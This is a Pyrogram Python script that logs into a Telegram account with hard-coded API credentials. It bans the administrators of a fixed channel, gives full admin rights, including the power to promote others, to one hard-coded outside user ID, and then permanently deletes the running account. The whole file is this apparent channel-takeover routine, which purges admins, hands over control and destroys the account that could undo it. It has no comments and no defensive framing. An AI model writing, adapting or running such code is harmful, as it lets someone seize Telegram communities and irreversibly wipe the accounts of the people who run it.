from pyrogram import Client, filters
from pyrogram.errors import UserNotParticipant, UserAdminInvalid, UserCreator, BadRequest
from pyrogram.enums import ChatMembersFilter
from pyrogram.types import ChatPrivileges

api_id = '20448123'
api_hash = 'e50f0b42d3636b96891ea98af1c78a00'

with Client("my_account", api_id, api_hash) as app:
    channels = [-1001771502107]
    ids = [6117965304]
    for channel in channels:
        admins = app.get_chat_members(channel, filter=ChatMembersFilter.ADMINISTRATORS)
        for admin in admins:
            try:
                app.ban_chat_member(channel, admin.user.id)
            except UserAdminInvalid:
                continue
            except UserCreator:
                continue
            except BadRequest:
                continue
        for user_id in ids:
            try:
                app.promote_chat_member(channel, user_id, ChatPrivileges(
                                        can_change_info=True,
                                        can_post_messages=True,
                                        can_edit_messages=True,
                                        can_delete_messages=True,
                                        can_invite_users=True,
                                        can_restrict_members=True,
                                        can_pin_messages=True,
                                        can_promote_members=True
                ))
            except UserNotParticipant:
                continue
    app.delete_account("I'm tired of telegrams")
